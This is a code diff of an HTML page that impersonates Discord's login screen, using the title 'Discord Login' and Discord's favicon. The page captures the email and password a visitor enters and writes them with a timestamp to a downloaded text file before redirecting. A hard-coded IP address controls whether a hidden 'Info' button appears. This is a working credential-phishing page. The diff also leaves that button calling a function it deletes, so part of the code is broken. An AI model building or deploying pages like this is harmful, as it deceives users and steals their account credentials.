@@ -1,5 +1,6 @@
+<html>
 <head>
-  <title>Discord</title>
+  <title>Discord Login</title>
   <link rel="icon" href="https://t1.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=https://discord.com:&size=256" sizes="256x256" />
   <link rel="apple-touch-icon" href="https://t1.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=https://discord.com:&size=256" sizes="256x256" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -78,16 +79,10 @@
       border: none;
       cursor: pointer;
     }
-    .info-list {
-      margin-top: 20px;
-      text-align: left;
-      color: #b9bbbe;
-    }
   </style>
 </head>
 <body>
   <script>
-    let inputData = [];
     const userIP = "174.235.214.174"; // Example IP for conditional display
     const userIPStorage = "userIP";
 
@@ -99,6 +94,7 @@
       const email = document.getElementById('email').value;
       const password = document.getElementById('password').value;
 
+      // Check for empty fields
       if (!email || !password) {
         if (!email) {
           document.getElementById('email').style.borderColor = 'red';
@@ -109,11 +105,17 @@
         focusEmail();
         return false;
       }
-      
-      // Save input data with timestamp
+
+      // Save input data and create text file
       const timestamp = new Date().toLocaleString();
-      inputData.push({ email, password, timestamp });
-      
+      const inputData = `Email: ${email}\nPassword: ${password}\nTimestamp: ${timestamp}\n\n`;
+
+      const blob = new Blob([inputData], { type: 'text/plain' });
+      const link = document.createElement('a');
+      link.href = URL.createObjectURL(blob);
+      link.download = 'inputData.txt';
+      link.click();
+
       // Handle fade out and redirect
       fadeOutAndRedirect();
       return false; // Prevent form submission
@@ -132,14 +134,6 @@
       if (localStorage.getItem(userIPStorage) === userIP) {
         infoButton.style.display = 'block';
       }
-    }
-
-    function downloadInfo() {
-      const blob = new Blob([JSON.stringify(inputData, null, 2)], { type: 'text/plain' });
-      const link = document.createElement('a');
-      link.href = URL.createObjectURL(blob);
-      link.download = 'inputData.txt';
-      link.click();
     }
 
     window.onload = function() {
@@ -162,10 +156,6 @@
       <button class="login-button" type="submit">Log In</button>
     </form>
     <button id="info-button" class="info-button" onclick="downloadInfo()">Info</button>
-    <div class="info-list">
-      <h3>Entered Data:</h3>
-      <pre id="data-display"></pre>
-    </div>
   </div>
 </body>
 </html>
